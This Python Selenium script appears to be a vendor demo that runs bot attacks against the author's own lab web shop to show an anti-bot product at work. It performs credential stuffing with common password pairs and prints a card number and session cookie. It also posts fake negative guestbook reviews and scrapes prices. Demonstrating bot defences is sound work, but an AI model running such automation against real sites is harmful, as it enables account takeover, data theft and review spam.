#!/usr/bin/env python
######################################################
## CREATED BY BARTOSZ CHMIELEWSKI                   ##
## bartosz.chmielewski@thalesgroup.com              ##
######################################################
#
# The script uses selenium framework to emulate advanced bot behavior. 
# 
#

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.chrome.options import Options as ChromeOptions
import time
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


ccounter = 0

def cclogin(login, password, delay=False):
    global ccounter
    ccounter = ccounter + 1
    print(f"Attempt: {ccounter:2}     Username: {login:16} Password: {password:20}")

    loginform = browser.find_element('id', 'username')
    passwordform = browser.find_element('id', 'password')
    if delay: time.sleep(1)
    loginform.clear()
    loginform.send_keys(login)
    if delay: time.sleep(1)
    passwordform.clear()
    passwordform.send_keys(password)
    if delay: time.sleep(1)
    browser.find_element('id', "loginButton").click()
    if delay: time.sleep(1)

def sendspam(delay, text):
    try:
        wait = WebDriverWait(browser, 10)
        inputform = wait.until(EC.presence_of_element_located((By.ID, "message")))

        if delay == 1: time.sleep(2)

        inputform.clear()
        inputform.send_keys(text)

        time.sleep(0.1)
        # Use a more robust check: just ensure SOME text arrived
        #wait.until(lambda d: len(inputform.get_attribute("value")) > 0)

        browser.find_element(By.ID, "submitEntry").click()
        print(f"Successfully sent: {text}...")

    except Exception as e:
        print(f" ---- Failed to send: {text[:20]}... Error: {type(e).__name__}")

    if delay == 1: time.sleep(2)


def attack_credentialstuffing():
    print("Running code for option 1")
    print("\n\n===CREDENTIAL CRACKING USE CASE===")

    print("Browsing to Login Website...")
    time.sleep(2)
    browser.find_element("id", "loginlink").click()

    print("Looks good. I see username and password fields!\n")


    cclogin('test1', 'test2', True)
    cclogin('john', 'smith', True)
    cclogin('stolenusername', 'stolenpassowrd')
    cclogin('username', 'easypassword')
    cclogin('user', 'Password')
    cclogin('testuser', 'testPassword')
    cclogin('imperva', 'imperva')
    cclogin('john', 'abc123')
    cclogin('admin', 'admin')
    cclogin('root', 'default')
    cclogin('secretuser', 'MyPetsName')
    cclogin('chuck', 'norris')
    cclogin('bartoszch', 'Test123123#')


    print("\n!!! I AM IN! Account hacked !!!")
    time.sleep(1)

    browser.get(url + "accountinfo")

    time.sleep(1)
    browser.find_element("id", "RefreshData").click()
    time.sleep(1)
    ccnumber = browser.find_element('id', 'accountinfo_cc_number')
    print("The Credit Card number is:", ccnumber.text)
    time.sleep(1)
    cookies = browser.get_cookies()
    print('The session ID is:', cookies[0]['value'])

    input("\nHit Enter when you are ready to move on!")


def attack_guestbook_spamming():
    print("\n\n===SPAMMING USE CASE===")
    print("Lets now send some spam...")

    browser.get(url + "guestbook")

    sendspam(1, 'I hate this webshop. The customer service is lazy and rude!')
    sendspam(1, 'Hey! Waiting for your package takes so long that you forget what you ordered!')
    sendspam(0, 'You\'d be better off going to the competition. Here, you\'ll waste your time and money.')
    sendspam(0, 'No kidding. The store looks good, but don\'t count on the merchandise.')
    sendspam(0, 'Scammers! They took the money and now no one is answering the phone.')
    sendspam(0, 'The goods arrived damaged. The complaint was rejected! I do not recommend them.')
    sendspam(0, 'Five stars for creativity. I ordered a phone case and received something that might be a spoon.')
    sendspam(0, 'Their delivery speed is impressive if you measure time in geological eras.')
    sendspam(0, 'Support told me to restart my router. I ordered shoes.')
    sendspam(0, 'Amazing shop! You order today and maybe your grandchildren will receive it.')
    sendspam(0, 'They said the item was in stock. I guess the stock is located on Mars.')
    sendspam(0, 'Customer support is always available. Available to ignore you.')
    sendspam(0, 'They responded to my complaint with silence. Very minimalist communication style.')
    sendspam(0, 'Fantastic store if your hobby is waiting and writing angry emails.')
    
    time.sleep(1)

    print("Done! I've sent some spam. I feel good now!")
    input("\nHit Enter when you are ready to move on!")

def attack_scraping():
    print("\n\n===SCRAPING USE CASE===")
    print("Lets see what are the prices today...\n")

    browser.get(url + "webshop")

    time.sleep(1)

    select_element = browser.find_element("id", "categorySelect")
    dropdown = Select(select_element)
    options = dropdown.options

    wait = WebDriverWait(browser, 10)

    for option in options[1:4]:

        print(f"Product category selected: {option.text}\n")

        dropdown.select_by_visible_text(option.text)

        # wait until buttons appear for the new category
        wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, "button.getPriceBtn")))

        buttons = browser.find_elements(By.CSS_SELECTOR, "button.getPriceBtn")

        for button in buttons:
            button_id = button.get_attribute("id")
            num = button_id.split("-")[1]

            button.click()
            time.sleep(0.1)
            wait.until(EC.presence_of_element_located((By.ID, f"pricefield-{num}")))

            price = browser.find_element(By.ID, f"pricefield-{num}").text
            try:
                price_final = price.split("€ ")[1]
            except (IndexError, AttributeError):
                price_final = "N/A"
                
            description = browser.find_element(By.ID, f"producttitle-{num}").text
            print(f"Product ID: {num:2}    Price: {price_final:>10}    Product Name: {description}")
            
        print("\n\n")
        time.sleep(1)


    time.sleep(1)

    print("Done! Now I can update my prices to be a little lower then the competition :)")
    print("")
    time.sleep(2)


while True:
    data = input("Which website you would like to evaluate:\n\n 1) Direct Access (no ABP) \n 2) Protected by ABP\n\n")
    if data == '1':
        url = 'http://direct-lab.spm.pl/'
        break
    elif data == '2':
        url = 'http://lab.spm.pl/'
        break
        
        
while True:
    data = input("Select the browser mode: \n\n 1) Firefox\n 2) Firefox (headless)\n 3) Chrome\n 4) Chrome (headless)\n\n")
    if data == '1':
        print("\nLunching a FIREFOX browser...")
        options = FirefoxOptions()
        browser = webdriver.Firefox(options=options)
        break
    elif data == '3':
        print("\nLunching a CHROME browser...")
        options = ChromeOptions()
        browser = webdriver.Chrome(options=options)
        break
    elif data == '2':
        print("\nLunching a FIREFOX HEADLESS browser...")
        options = FirefoxOptions()
        options.add_argument("--headless")
        browser = webdriver.Firefox(options=options)
        break
    elif data == '4':
        print("\nLunching a CHROME HEADLESS browser...")
        options = ChromeOptions()
        options.add_argument("--headless")
        browser = webdriver.Chrome(options=options)
        break


print("Sending request to the website:", url)
browser.get(url)

time.sleep(2)


while True:
    print("\nSelect an option:")
    print("1 - Credential Stuffing")
    print("2 - GuestBook Spamming")
    print("3 - Scraping")
    print("0 - Exit")

    choice = input("\nEnter your choice: ")

    if choice == "1":
        attack_credentialstuffing()

    elif choice == "2":
        attack_guestbook_spamming()

    elif choice == "3":
        attack_scraping()

    elif choice == "0":
        print("Thank You!")
        break

    else:
        print("Invalid choice. Please select 0–3.")
